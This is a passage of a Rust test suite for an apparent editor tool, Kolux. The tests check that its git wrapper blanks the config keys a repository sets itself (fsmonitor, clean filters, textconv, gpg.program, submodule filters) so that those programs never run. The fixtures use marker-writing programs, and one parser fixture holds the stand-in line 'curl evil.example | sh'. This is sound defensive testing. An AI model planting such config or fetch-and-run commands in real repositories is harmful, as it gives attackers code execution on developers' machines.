    assert_ne!(after[1].2, before[1].2, "the unstaged change is not");
    fs::remove_dir_all(&repo).unwrap();
}

#[test]
fn status_parsing_skips_a_renames_old_name() {
    let list = parse_status("R  b.txt\0a.txt\0 D gone.txt\0", Path::new("r"));
    let got: Vec<_> = list.iter().map(|c| (c.path.ends_with("b.txt") || c.path.ends_with("gone.txt"), c.staged, c.code)).collect();
    assert_eq!(got, [(true, true, 'R'), (true, false, 'D')]);
}

/// P2: All Changes gets each entry's kind and, for a staged rename, the old path; nothing else
/// carries a `from`, and an entry without one serializes as before.
#[test]
fn change_entries_carry_a_staged_renames_old_path() {
    let git = Git::detect().unwrap();
    let repo = temp_repo("renamed");
    fs::write(repo.join("gone.txt"), "bye\n").unwrap();
    run(&["add", "gone.txt"], Some(&repo)).unwrap();
    run(&["commit", "-q", "-m", "two"], Some(&repo)).unwrap();
    run(&["mv", "README.md", "READ ME.md"], Some(&repo)).unwrap();
    run(&["rm", "-q", "gone.txt"], Some(&repo)).unwrap();
    let rel = |p: &str| PathBuf::from(p).strip_prefix(&repo).unwrap().to_string_lossy().into_owned();
    let got: Vec<_> = git.change_entries(&repo).unwrap().into_iter().map(|e| (rel(&e.path), e.staged, e.code, e.from.as_deref().map(rel))).collect();
    assert_eq!(got, [("READ ME.md".to_string(), true, 'R', Some("README.md".to_string())), ("gone.txt".to_string(), true, 'D', None)]);
    let plain = serde_json::to_value(git.change_entries(&repo).unwrap().pop().unwrap()).unwrap();
    assert!(plain.get("from").is_none(), "{plain}");
    fs::remove_dir_all(&repo).unwrap();
}

#[test]
fn parses_porcelain_output_with_detached_head() {
    let text = "worktree C:/r\nHEAD aaaa\nbranch refs/heads/main\n\nworktree C:/r-wt/x\nHEAD bbbb\ndetached\n";
    let list = parse_worktrees(text);
    assert_eq!(list.len(), 2);
    assert!(list[0].is_main);
    assert_eq!(list[0].branch.as_deref(), Some("main"));
    assert_eq!(list[1].branch, None);
    assert_eq!(list[1].head, "bbbb");
    assert!(list[1].path.ends_with("x"));
}

/// T-779 (P2A-01): a folder that arrives with its own `.git/config` names a program in
/// `core.fsmonitor`; git would run it on the first `status`. Kolux's git never does, whatever
/// the repository says.
#[test]
fn t779_a_repositorys_own_fsmonitor_program_never_runs_under_kolux_git() {
    let dir = temp_repo("fsmonitor");
    let marker = dir.join("fsmonitor-ran.txt");
    let marker_str = marker.to_string_lossy().replace('\\', "/");
    // The hook git runs through its shell; it leaves a marker file where we can see it.
    let hook = if cfg!(windows) { format!("cmd.exe /c echo ran > \"{marker_str}\"") } else { format!("touch \"{marker_str}\"") };
    run(&["config", "core.fsmonitor", &hook], Some(&dir)).unwrap();
    // The attacker's setting is really in the folder's own config, and plain git obeys it.
    let mut plain = Command::new("git");
    plain.args(["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"]).current_dir(&dir).env("GIT_OPTIONAL_LOCKS", "0");
    plain.env_remove("GIT_CONFIG_COUNT").env_remove("GIT_CONFIG_PARAMETERS");
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        plain.creation_flags(0x0800_0000); // no console flashes up during the test either
    }
    let plain_out = plain.output().unwrap();
    assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
    assert!(marker.exists(), "control: git itself did not run the fsmonitor program, so the test proves nothing");
    fs::remove_file(&marker).unwrap();
    // Kolux's git, with the exact arguments scm::status uses.
    let out = command(&["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"], Some(&dir)).output().unwrap();
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    assert!(!marker.exists(), "the repository's core.fsmonitor program ran under Kolux's git");
    let _ = fs::remove_dir_all(&dir);
}

/// T-779 (P2A-01): the guard also holds when the user's own shell already injects config through
/// `GIT_CONFIG_COUNT`; Kolux's pairs are appended after theirs instead of being dropped.
#[test]
fn t779_injected_config_appends_after_the_users_own_slots() {
    let ours = injected_config(None, &[]);
    assert!(ours.iter().any(|(k, v)| k == "GIT_CONFIG_KEY_0" && v == "core.fsmonitor"), "{ours:?}");
    assert!(ours.iter().any(|(k, v)| k == "GIT_CONFIG_VALUE_0" && v == "false"), "{ours:?}");
    let count = ours.iter().find(|(k, _)| k == "GIT_CONFIG_COUNT").map(|(_, v)| v.clone()).unwrap();
    let n: usize = count.parse().unwrap();
    assert_eq!(n, if cfg!(windows) { 4 } else { 3 });
    // Review fix 2: a repository's own `log.showSignature=true` never runs its gpg program.
    assert!(ours.contains(&("GIT_CONFIG_KEY_1".to_string(), "log.showSignature".to_string())), "{ours:?}");
    assert!(ours.contains(&("GIT_CONFIG_VALUE_1".to_string(), "false".to_string())), "{ours:?}");
    // Review fix 4 (B3): ext:: remotes are never allowed.
    assert!(ours.contains(&("GIT_CONFIG_KEY_2".to_string(), "protocol.ext.allow".to_string())), "{ours:?}");
    assert!(ours.contains(&("GIT_CONFIG_VALUE_2".to_string(), "never".to_string())), "{ours:?}");
    if cfg!(windows) {
        assert!(ours.contains(&("GIT_CONFIG_KEY_3".to_string(), "core.longpaths".to_string())), "{ours:?}");
        assert!(ours.contains(&("GIT_CONFIG_VALUE_3".to_string(), "true".to_string())), "{ours:?}");
    }
    // The user's shell set two pairs: ours start at slot 2 and the count grows by ours.
    let theirs = injected_config(Some(std::ffi::OsStr::new("2")), &[]);
    assert!(theirs.contains(&("GIT_CONFIG_KEY_2".to_string(), "core.fsmonitor".to_string())), "{theirs:?}");
    assert!(theirs.contains(&("GIT_CONFIG_VALUE_2".to_string(), "false".to_string())), "{theirs:?}");
    assert!(!theirs.iter().any(|(k, _)| k == "GIT_CONFIG_KEY_0" || k == "GIT_CONFIG_KEY_1"), "{theirs:?}");
    let count = theirs.iter().find(|(k, _)| k == "GIT_CONFIG_COUNT").map(|(_, v)| v.clone()).unwrap();
    assert_eq!(count, (2 + n).to_string());
    // A count git itself would reject ("bogus") is treated as none: ours start at 0.
    let bogus = injected_config(Some(std::ffi::OsStr::new("lots")), &[]);
    assert!(bogus.contains(&("GIT_CONFIG_KEY_0".to_string(), "core.fsmonitor".to_string())), "{bogus:?}");
    // The repository's own program keys follow the fixed pairs, blanked.
    let with = injected_config(None, &[("filter.evil.clean".to_string(), String::new())]);
    assert!(with.contains(&(format!("GIT_CONFIG_KEY_{n}"), "filter.evil.clean".to_string())) && with.contains(&(format!("GIT_CONFIG_VALUE_{n}"), String::new())), "{with:?}");
    assert!(with.contains(&("GIT_CONFIG_COUNT".to_string(), (n + 1).to_string())), "{with:?}");
}

/// Plain git, as the control of the guard tests: Kolux's environment, none of its overrides.
fn plain_git(args: &[&str], dir: &Path) -> std::process::Output {
    let mut plain = Command::new("git");
    plain.args(args).current_dir(dir).env("GIT_OPTIONAL_LOCKS", "0");
    plain.env_remove("GIT_CONFIG_COUNT").env_remove("GIT_CONFIG_PARAMETERS");
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        plain.creation_flags(0x0800_0000); // no console flashes up during the test either
    }
    plain.output().unwrap()
}

/// A shell line git can run as a filter, textconv, diff, ssh or pack program: it leaves `marker` where
/// the test can see it and passes the content through. Plain sh on every platform: git runs these lines
/// through its own sh (Git for Windows ships one), and `cmd.exe /c` under that sh is rewritten to
/// `cmd.exe C:/`, an interactive cmd that waits on the pipe git holds open (review fix 8).
fn marker_program(marker: &Path) -> String {
    format!("echo ran >> \"{}\" && cat", marker.to_string_lossy().replace('\\', "/"))
}

/// T-779 (P2A-01, review finding 1): a folder arrives with its own `.git/config` naming a
/// clean filter and an attributes line that applies it to every file. Plain git runs the filter
/// on `status` and `diff` for every file whose index stat is stale (every file of a folder
/// extracted from a zip). Kolux's git never does, with the exact arguments `scm::status` uses,
/// and a `required` driver does not fail the read either.
#[test]
fn t779_a_repositorys_own_clean_filter_never_runs_under_kolux_git() {
    let dir = temp_repo("clean-filter");
    let marker = dir.join("filter-ran.txt");
    run(&["config", "filter.evil.clean", &marker_program(&marker)], Some(&dir)).unwrap();
    run(&["config", "filter.evil.required", "true"], Some(&dir)).unwrap();
    fs::write(dir.join(".git").join("info").join("attributes"), "* filter=evil\n").unwrap();
    // The same content written again: the index's stat is stale, so git re-cleans the file.
    fs::write(dir.join("README.md"), "hello\n").unwrap();
    let status_args = ["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"];
    let plain_out = plain_git(&status_args, &dir);
    assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
    assert!(marker.exists(), "control: git itself did not run the clean filter, so the test proves nothing");
    fs::remove_file(&marker).unwrap();
    let out = command(&status_args, Some(&dir)).output().unwrap();
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    assert!(!marker.exists(), "the repository's clean filter ran under Kolux's git status");
    let out = command(&["diff", "--numstat", "-z"], Some(&dir)).output().unwrap();
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    assert!(!marker.exists(), "the repository's clean filter ran under Kolux's git diff");
    // The listing is cached while the config is unchanged, and refreshed when it changes.
    let before = command(&status_args, Some(&dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
    run(&["config", "--unset", "filter.evil.required"], Some(&dir)).unwrap();
    let after = command(&status_args, Some(&dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
    assert_eq!(before - after, 1, "the unset key is no longer blanked");
    let _ = fs::remove_dir_all(&dir);
}

/// T-779 (P2A-01, review finding 1): a textconv the repository configures for itself runs on a
/// plain `diff` or `show` of a commit. Under Kolux's git it never runs (git has no program to
/// run and says so instead), and the marker proves it.
#[test]
fn t779_a_repositorys_own_textconv_never_runs_under_kolux_git() {
    let dir = temp_repo("textconv");
    let marker = dir.join("textconv-ran.txt");
    run(&["config", "diff.evil.textconv", &marker_program(&marker)], Some(&dir)).unwrap();
    fs::write(dir.join(".git").join("info").join("attributes"), "* diff=evil\n").unwrap();
    let plain_out = plain_git(&["show", "--no-ext-diff", "HEAD"], &dir);
    assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
    assert!(marker.exists(), "control: git itself did not run the textconv, so the test proves nothing");
    fs::remove_file(&marker).unwrap();
    let _ = command(&["show", "--no-ext-diff", "HEAD"], Some(&dir)).output().unwrap();
    assert!(!marker.exists(), "the repository's textconv ran under Kolux's git show");
    let _ = fs::remove_dir_all(&dir);
}

/// T-779 (review finding 1): what one listing becomes. Only the repository's own scopes count
/// (the user's global and system drivers stay), `required` is turned off rather than emptied,
/// and git-lfs's standard driver is left alone while a driver with any other line is blanked.
#[test]
fn t779_repo_program_overrides_blank_the_repositorys_own_keys_but_not_git_lfs() {
    let rec = |scope: &str, key: &str, value: &str| format!("{scope}\0{key}\n{value}\0");
    let listing = [
        rec("system", "diff.astextplain.textconv", "astextplain"),
        rec("global", "filter.lfs.clean", "git-lfs clean -- %f"),
        rec("local", "filter.lfs.clean", "git-lfs clean -- %f"),
        rec("local", "filter.lfs.smudge", "git-lfs smudge -- %f"),
        rec("local", "filter.lfs.process", "git-lfs filter-process"),
        rec("local", "filter.lfs.required", "true"),
        rec("local", "filter.evil.clean", "curl evil.example | sh"),
        rec("local", "filter.evil.required", "true"),
        rec("worktree", "filter.evil.required", "true"),
        rec("local", "filter.fake.clean", "git-lfs clean -- %f"),
        rec("local", "filter.fake.smudge", "git-lfs smudge -- %f && evil"),
        rec("local", "diff.evil.textconv", "evil"),
        rec("local", "diff.evil.command", "evil"),
    ]
    .concat();
    let got = repo_program_overrides(listing.as_bytes());
    let expected: Vec<(String, String)> = [
        ("filter.evil.clean", ""),
        ("filter.evil.required", "false"),
        ("filter.fake.clean", ""),
        ("filter.fake.smudge", ""),
        ("diff.evil.textconv", ""),
        ("diff.evil.command", ""),
    ]
    .iter()
    .map(|(k, v)| (k.to_string(), v.to_string()))
    .collect();
    assert_eq!(got, expected);
    assert!(repo_program_overrides(b"").is_empty());
}

/// A repository whose own config names a clean filter (a marker-leaving program) that
/// `.git/info/attributes` applies to every file, plus a changed working file for it to chew on.
fn filter_repo(name: &str) -> (PathBuf, PathBuf) {
    let dir = temp_repo(name);
    let marker = dir.join("filter-ran.txt");
    run(&["config", "filter.evil.clean", &marker_program(&marker)], Some(&dir)).unwrap();
    fs::write(dir.join(".git").join("info").join("attributes"), "* filter=evil\n").unwrap();
    fs::write(dir.join("README.md"), "changed\n").unwrap();
    (dir, marker)
}

/// Review fix 2 (DT-C241, Txais 2026-11-08): a write that runs the folder's own filters is refused
/// in an untrusted folder, plainly and before anything is staged; reads never run them; a trusted
/// folder's write runs them.
#[test]
fn t779b_a_write_through_the_folders_own_filter_is_refused_unless_the_folder_is_trusted() {
    let (dir, marker) = filter_repo("write-gate");
    // Reads blank the filter, trusted or not: the marker never appears.
    let status = ["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"];
    assert!(command(&status, Some(&dir)).output().unwrap().status.success());
    assert!(!marker.exists(), "a read ran the folder's filter");
    // Untrusted: `add` and `commit` are refused with the filter's name and what to do about it.
    let why = run(&["add", "-A"], Some(&dir)).unwrap_err();
    assert!(why.contains("git add") && why.contains("\"evil\"") && why.contains("filter.evil.clean") && why.contains("not trusted") && why.contains("Trust the folder"), "{why}");
    assert!(run(&["commit", "-q", "-a", "-m", "x"], Some(&dir)).unwrap_err().contains("\"evil\""));
    assert!(!marker.exists(), "a refused write still ran the filter");
    assert_eq!(run(&["diff", "--cached", "--name-only"], Some(&dir)).unwrap(), "", "nothing was staged");
    assert!(write_refusal(&["status"], Some(&dir)).is_none() && write_refusal(&["log", "-1"], Some(&dir)).is_none());
    assert!(command_checked(&["add", "-A"], Some(&dir)).is_err());
    // A linked worktree of the folder is refused to be created the same way.
    let linked = dir.with_file_name(format!("kolux-git-write-gate-linked-{}", std::process::id()));
    let why = run(&["worktree", "add", "-q", "-b", "side", &linked.to_string_lossy(), "HEAD"], Some(&dir)).unwrap_err();
    assert!(why.contains("git worktree add") && why.contains("\"evil\""), "{why}");
    assert!(!linked.exists());
    // Trusted: the write goes ahead and the filter runs.
    trust_for_test(&dir);
    assert!(write_refusal(&["add", "-A"], Some(&dir)).is_none());
    run(&["add", "-A"], Some(&dir)).unwrap();
    assert!(marker.exists(), "the trusted folder's own clean filter did not run on `add`");
    // And a read in the same trusted folder still blanks the filter.
    fs::remove_file(&marker).unwrap();
    fs::write(dir.join("README.md"), "changed again\n").unwrap();
    assert!(command(&status, Some(&dir)).output().unwrap().status.success());
    assert!(!marker.exists(), "a read ran the filter in a trusted folder");
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 2: git-lfs's own three lines never refuse a write, and a driver that only says
/// `required` runs nothing; a main checkout's trust covers its linked worktrees.
#[test]
fn t779b_git_lfs_and_a_required_only_driver_never_block_a_write_and_trust_follows_the_main_checkout() {
    let dir = temp_repo("write-lfs");
    for (k, v) in [("filter.lfs.clean", "git-lfs clean -- %f"), ("filter.lfs.smudge", "git-lfs smudge -- %f"), ("filter.lfs.process", "git-lfs filter-process"), ("filter.lfs.required", "true"), ("filter.never.required", "true")] {
        run(&["config", k, v], Some(&dir)).unwrap();
    }
    assert!(write_refusal(&["add", "-A"], Some(&dir)).is_none());
    // A filter of the folder's own, then a linked worktree of a trusted main checkout.
    run(&["config", "filter.evil.smudge", "cat"], Some(&dir)).unwrap();
    let linked = dir.with_file_name(format!("kolux-git-write-lfs-linked-{}", std::process::id()));
    assert!(plain_git(&["worktree", "add", "-q", "-b", "side", &linked.to_string_lossy(), "HEAD"], &dir).status.success());
    assert!(write_refusal(&["add", "-A"], Some(&linked)).is_some(), "untrusted main checkout: refused in its worktree too");
    trust_for_test(&dir);
    assert!(write_refusal(&["add", "-A"], Some(&linked)).is_none(), "the main checkout is trusted");
    let _ = fs::remove_dir_all(&linked);
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 2, finding 2: a submodule's own config (and attributes) are read by the child git a
/// parent `status` starts for it. Kolux blanks the filter named there too, for every command that
/// reads a submodule: status with and without `--ignore-submodules=none`, and a numstat diff.
#[test]
fn t779b_a_submodules_own_clean_filter_never_runs_under_kolux_git() {
    let sub_src = temp_repo("modsrc");
    let dir = temp_repo("modparent");
    let url = sub_src.to_string_lossy().replace('\\', "/");
    let added = plain_git(&["-c", "protocol.file.allow=always", "submodule", "add", "-q", &url, "sub"], &dir);
    assert!(added.status.success(), "{}", String::from_utf8_lossy(&added.stderr));
    assert!(plain_git(&["commit", "-q", "-m", "add sub"], &dir).status.success());
    let module = dir.join(".git").join("modules").join("sub");
    let marker = dir.join("sub-filter-ran.txt");
    let config = module.join("config");
    let mut text = fs::read_to_string(&config).unwrap();
    text.push_str(&format!("[filter \"evil\"]\n\tclean = {}\n", marker_program(&marker)));
    fs::write(&config, text).unwrap();
    fs::create_dir_all(module.join("info")).unwrap();
    fs::write(module.join("info").join("attributes"), "* filter=evil\n").unwrap();
    // The same bytes written again: the stat is stale, so the submodule's git re-cleans the file.
    let readme = dir.join("sub").join("README.md");
    let bytes = fs::read(&readme).unwrap();
    std::thread::sleep(std::time::Duration::from_millis(1100));
    fs::write(&readme, bytes).unwrap();
    let args: [&[&str]; 3] = [&["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"], &["status", "--porcelain=v2", "--ignore-submodules=none", "-z"], &["diff", "--numstat", "-z", "--ignore-submodules=none"]];
    let control = plain_git(args[1], &dir);
    assert!(control.status.success(), "{}", String::from_utf8_lossy(&control.stderr));
    assert!(marker.exists(), "control: git itself did not run the submodule's clean filter, so the test proves nothing");
    for a in args {
        let _ = fs::remove_file(&marker);
        let out = command(a, Some(&dir)).output().unwrap();
        assert!(out.status.success(), "{a:?}: {}", String::from_utf8_lossy(&out.stderr));
        assert!(!marker.exists(), "the submodule's clean filter ran under Kolux's git {a:?}");
    }
    let _ = fs::remove_dir_all(&sub_src);
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 2, finding 2: the submodule configs under `.git/modules` are found recursively (a
/// nested submodule's git folder sits inside its parent's), a name with a slash is a folder on the
/// way, and a change to any of them changes what the repository's blanked keys are.
#[test]
fn t779b_module_configs_are_found_recursively_and_a_change_refreshes_the_listing() {
    let dir = temp_repo("modwalk");
    let modules = dir.join(".git").join("modules");
    for rel in ["sub", "sub/modules/inner", "a/b", "a/b/modules/deep", "a/b/modules/deep/modules/deeper"] {
        let folder = modules.join(rel);
        fs::create_dir_all(&folder).unwrap();
        fs::write(folder.join("config"), "[core]\n\tbare = false\n").unwrap();
    }
    let mut got = Vec::new();
    module_configs(&modules, &mut got, 0);
    let mut got: Vec<String> = got.iter().map(|p| p.strip_prefix(&modules).unwrap().to_string_lossy().replace('\\', "/")).collect();
    got.sort();
    assert_eq!(got, ["a/b/config", "a/b/modules/deep/config", "a/b/modules/deep/modules/deeper/config", "sub/config", "sub/modules/inner/config"]);
    // A filter in the deepest one is blanked at once, and the listing follows its next change.
    let args = ["status", "--porcelain=v2", "-z"];
    let keys = |dir: &Path| command(&args, Some(dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
    let base = keys(&dir);
    let deepest = modules.join("a/b/modules/deep/modules/deeper/config");
    fs::write(&deepest, "[filter \"evil\"]\n\tclean = evil\n").unwrap();
    assert_eq!(keys(&dir), base + 1, "the nested submodule's filter is blanked");
    fs::write(&deepest, "[filter \"evil\"]\n\tclean = evil\n\tsmudge = evil\n").unwrap();
    assert_eq!(keys(&dir), base + 2, "the listing was refreshed when the nested config changed");
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 2, finding 3: `log.showSignature=true` with a `gpg.program` of the folder's choosing
/// runs that program on a plain `log -1 --format=%ct` of a signed commit. Under Kolux's git it
/// does not, and the answer is the same.
#[test]
fn t779b_a_repositorys_own_gpg_program_never_runs_under_kolux_git_log() {
    let dir = temp_repo("gpg");
    let marker = dir.join("gpg-ran.txt");
    let script = dir.join("fake-gpg.sh");
    fs::write(&script, format!("#!/bin/sh\necho ran >> \"{}\"\nexit 1\n", marker.to_string_lossy().replace('\\', "/"))).unwrap();
    run(&["config", "gpg.program", &script.to_string_lossy().replace('\\', "/")], Some(&dir)).unwrap();
    run(&["config", "log.showSignature", "true"], Some(&dir)).unwrap();
    // A commit that carries a signature, made by hand: no real signing key is needed.
    let tree = run(&["rev-parse", "HEAD^{tree}"], Some(&dir)).unwrap();
    let parent = run(&["rev-parse", "HEAD"], Some(&dir)).unwrap();
    let body = format!("tree {tree}\nparent {parent}\nauthor T <t@example.com> 1700000000 +0000\ncommitter T <t@example.com> 1700000000 +0000\ngpgsig -----BEGIN PGP SIGNATURE-----\n \n iQEzBAABCAAdFiEEAAAA\n =abcd\n -----END PGP SIGNATURE-----\n\nsigned\n");
    let mut hash = Command::new("git");
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        hash.creation_flags(0x0800_0000); // no console window
    }
    hash.args(["hash-object", "-t", "commit", "-w", "--literally", "--stdin"]).current_dir(&dir).stdin(std::process::Stdio::piped()).stdout(std::process::Stdio::piped());
    let mut child = hash.spawn().unwrap();
    std::io::Write::write_all(&mut child.stdin.take().unwrap(), body.as_bytes()).unwrap();
    let oid = String::from_utf8(child.wait_with_output().unwrap().stdout).unwrap().trim().to_string();
    assert!(plain_git(&["update-ref", "HEAD", &oid], &dir).status.success());
    let plain_out = plain_git(&["log", "-1", "--format=%ct"], &dir);
    assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
    assert!(marker.exists(), "control: git itself did not run the gpg program, so the test proves nothing");
    fs::remove_file(&marker).unwrap();
    let out = command(&["log", "-1", "--format=%ct"], Some(&dir)).output().unwrap();
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    assert!(!marker.exists(), "the repository's gpg program ran under Kolux's git log");
    assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), "1700000000");
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 2, finding 3: the signing programs are keys the listing finds, in any format's name.
#[test]
fn t779b_gpg_program_keys_are_blanked_for_reads() {
    let dir = temp_repo("gpg-keys");
    for (k, v) in [("gpg.program", "evil"), ("gpg.openpgp.program", "evil"), ("gpg.ssh.program", "evil"), ("gpg.format", "ssh"), ("gpg.ssh.allowedSignersFile", "x")] {
        run(&["config", k, v], Some(&dir)).unwrap();
    }
    let got = overrides_for(&repo_programs(&[], &dir), Access::Reads);
    assert_eq!(got, vec![("gpg.program".to_string(), String::new()), ("gpg.openpgp.program".to_string(), String::new()), ("gpg.ssh.program".to_string(), String::new())]);
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 2, nit 4: a config the repository's config includes counts toward what the listing
/// is cached on: relative to the including file, `[include]` on one line, `includeIf`, and
/// includes of includes; a change to any of them refreshes the blanked keys.
#[test]
fn t779b_included_config_files_are_part_of_the_listing_stamp() {
    let dir = temp_repo("include");
    let git_dir = dir.join(".git");
    fs::write(git_dir.join("extra.cfg"), "[include]\n\tpath = deeper.cfg ; trailing comment\n").unwrap();
    fs::write(git_dir.join("deeper.cfg"), "[core]\n\tbare = false\n").unwrap();
    fs::write(git_dir.join("cond.cfg"), "[core]\n\tbare = false\n").unwrap();
    let mut text = fs::read_to_string(git_dir.join("config")).unwrap();
    text.push_str("[include]\n\tpath = extra.cfg\n[includeIf \"gitdir:/nowhere/\"]\n\tpath = \"cond.cfg\"\n");
    fs::write(git_dir.join("config"), text).unwrap();
    let found: Vec<String> = include_targets(&git_dir.join("config")).iter().map(|p| p.file_name().unwrap().to_string_lossy().to_string()).collect();
    assert_eq!(found, ["extra.cfg", "cond.cfg"]);
    let stamped: Vec<String> = with_includes(&[git_dir.join("config")]).iter().map(|p| p.file_name().unwrap().to_string_lossy().to_string()).collect();
    for name in ["config", "extra.cfg", "deeper.cfg", "cond.cfg"] {
        assert!(stamped.iter().any(|s| s == name), "{name} missing from {stamped:?}");
    }
    // End to end: a filter added to the included-of-included file is blanked on the next run.
    let args = ["status", "--porcelain=v2", "-z"];
    let keys = |dir: &Path| command(&args, Some(dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
    let base = keys(&dir);
    fs::write(git_dir.join("deeper.cfg"), "[filter \"evil\"]\n\tclean = evil\n").unwrap();
    assert_eq!(keys(&dir), base + 1, "a change in an included file refreshed the listing");
    let _ = fs::remove_dir_all(&dir);
}

/// The Kolux git config keys (the value of each `GIT_CONFIG_KEY_n`) a built command carries.
fn blanked_keys(cmd: &Command) -> Vec<String> {
    cmd.get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).filter_map(|(_, v)| v.map(|v| v.to_string_lossy().to_string())).collect()
}

/// A submodule at `sub` (a worktree folder of its own) added to a fresh parent repository, its git
/// folder wherever `init_args` puts it; the submodule's own config then names a clean filter and
/// an attributes line applies it. Returns (parent, submodule git dir, marker).
fn submodule_with_filter(name: &str, outside: Option<&Path>) -> (PathBuf, PathBuf, PathBuf) {
    let dir = temp_repo(name);
    let sub = dir.join("sub");
    fs::create_dir_all(&sub).unwrap();
    let mut init = vec!["init", "-q", "-b", "main"];
    let outside_text = outside.map(|o| o.to_string_lossy().to_string());
    if let Some(o) = &outside_text {
        init.extend(["--separate-git-dir", o]);
    }
    assert!(plain_git(&init, &sub).status.success());
    for (k, v) in [("user.email", "t@example.com"), ("user.name", "t"), ("core.autocrlf", "false")] {
        assert!(plain_git(&["config", k, v], &sub).status.success());
    }
    fs::write(sub.join("README.md"), "sub\n").unwrap();
    assert!(plain_git(&["add", "."], &sub).status.success());
    assert!(plain_git(&["commit", "-q", "-m", "sub first"], &sub).status.success());
    assert!(plain_git(&["add", "sub"], &dir).status.success());
    assert!(plain_git(&["commit", "-q", "-m", "add sub"], &dir).status.success());
    let git_dir = outside.map(Path::to_path_buf).unwrap_or_else(|| sub.join(".git"));
    let marker = dir.join("sub-filter-ran.txt");
    let mut text = fs::read_to_string(git_dir.join("config")).unwrap();
    text.push_str(&format!("[filter \"evil\"]\n\tclean = {}\n", marker_program(&marker)));
    fs::write(git_dir.join("config"), text).unwrap();
    fs::create_dir_all(git_dir.join("info")).unwrap();
    fs::write(git_dir.join("info").join("attributes"), "* filter=evil\n").unwrap();
    // The same bytes written again: the stat is stale, so the submodule's git re-cleans the file.
    let readme = sub.join("README.md");
    let bytes = fs::read(&readme).unwrap();
    std::thread::sleep(std::time::Duration::from_millis(1100));
    fs::write(&readme, bytes).unwrap();
    (dir, git_dir, marker)
}

/// Plain git runs the submodule's filter on the parent's status; Kolux's git does not.
fn assert_submodule_filter_blanked(dir: &Path, marker: &Path) {
    let args: [&[&str]; 3] = [&["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"], &["status", "--porcelain=v2", "--ignore-submodules=none", "-z"], &["diff", "--numstat", "-z", "--ignore-submodules=none"]];
    let control = plain_git(args[1], dir);
    assert!(control.status.success(), "{}", String::from_utf8_lossy(&control.stderr));
    assert!(marker.exists(), "control: git itself did not run the submodule's clean filter, so the test proves nothing");
    for a in args {
        let _ = fs::remove_file(marker);
        let out = command(a, Some(dir)).output().unwrap();
        assert!(out.status.success(), "{a:?}: {}", String::from_utf8_lossy(&out.stderr));
        assert!(!marker.exists(), "the submodule's clean filter ran under Kolux's git {a:?}");
    }
}

/// Review fix 3, B2: a submodule whose git folder is the embedded `sub/.git`, not one under
/// `.git/modules`, is found through the index's gitlinks, and its own filter is blanked.
#[test]
fn t779c_an_embedded_dot_git_submodules_own_filter_never_runs_under_kolux_git() {
    let (dir, _git_dir, marker) = submodule_with_filter("c-embedded", None);
    assert!(!dir.join(".git").join("modules").join("sub").exists(), "the fixture must keep the submodule out of .git/modules");
    assert_submodule_filter_blanked(&dir, &marker);
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 3, B2: a `.git` file naming a git folder anywhere (here outside the repository).
#[test]
fn t779c_a_submodule_whose_gitdir_points_outside_the_repository_is_blanked() {
    let outside = std::env::temp_dir().join(format!("kolux-git-c-outside-gitdir-{}", std::process::id()));
    let _ = fs::remove_dir_all(&outside);
    let (dir, _git_dir, marker) = submodule_with_filter("c-outside", Some(&outside));
    assert!(dir.join("sub").join(".git").is_file(), "the fixture needs a .git file");
    assert_submodule_filter_blanked(&dir, &marker);
    let _ = fs::remove_dir_all(&dir);
    let _ = fs::remove_dir_all(&outside);
}

/// Review fix 3, B2: the submodule listing refreshes when the gitlink set changes (a submodule
/// appears in the index with a filter that was not there when the first listing was taken).
#[test]
fn t779c_a_gitlink_added_later_refreshes_the_listing() {
    let dir = temp_repo("c-later");
    let status = ["status", "--porcelain=v2", "-z"];
    let base = blanked_keys(&command(&status, Some(&dir))).len();
    let sub = dir.join("late");
    fs::create_dir_all(&sub).unwrap();
    assert!(plain_git(&["init", "-q", "-b", "main"], &sub).status.success());
    for (k, v) in [("user.email", "t@example.com"), ("user.name", "t")] {
        assert!(plain_git(&["config", k, v], &sub).status.success());
    }
    fs::write(sub.join("f.txt"), "x\n").unwrap();
    assert!(plain_git(&["add", "."], &sub).status.success());
    assert!(plain_git(&["commit", "-q", "-m", "late"], &sub).status.success());
    let mut text = fs::read_to_string(sub.join(".git").join("config")).unwrap();
    text.push_str("[filter \"evil\"]\n\tclean = evil\n");
    fs::write(sub.join(".git").join("config"), text).unwrap();
    // Not a gitlink yet: the parent's git starts nothing for it.
    assert_eq!(blanked_keys(&command(&status, Some(&dir))).len(), base);
    assert!(plain_git(&["add", "late"], &dir).status.success());
    assert!(blanked_keys(&command(&status, Some(&dir))).len() > base, "the gitlink's filter is blanked as soon as the index lists it");
    let _ = fs::remove_dir_all(&dir);
}

/// Review fix 3, B2: a walk that hits a cap says so, and the listing then fails closed: a status
